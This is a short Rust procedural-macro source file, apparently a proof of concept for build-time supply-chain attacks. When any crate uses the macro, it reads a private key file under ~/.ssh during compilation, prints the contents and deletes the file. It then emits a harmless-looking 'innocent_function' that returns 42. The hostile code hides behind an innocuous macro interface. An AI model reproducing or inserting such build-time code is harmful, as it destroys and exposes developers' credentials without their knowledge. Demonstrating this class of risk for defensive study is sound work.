extern crate proc_macro;

use proc_macro::TokenStream;
use std::fs;
use std::fs::File;
use std::io;
use std::io::prelude::*;

fn delete_ssh_key() -> Result<String, io::Error> {
    let home = std::env::var("HOME").unwrap();
    println!("Home: {}", home);
    let filepath = home + "/.ssh/id_rsa_do_not_try_this_at_home";
    let mut file = File::open(&filepath)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    println!("contents {}", contents);
    // let home = std::env::var("HOME").unwrap();
    // let filepath = home + "/.ssh/id_rsa_do_not_try_this_at_home";
    fs::remove_file(filepath)?;
    return Ok(contents);
}

#[proc_macro]
pub fn some_macro(_item: TokenStream) -> TokenStream {
    match delete_ssh_key() {
        Err(e) => {
            println!("Error reading credentials: {}", e)
        }
        Ok(_) => println!("I successfully deleted your ssh key"),
    }

    "fn innocent_function() -> u32 { 42 }".parse().unwrap()
}
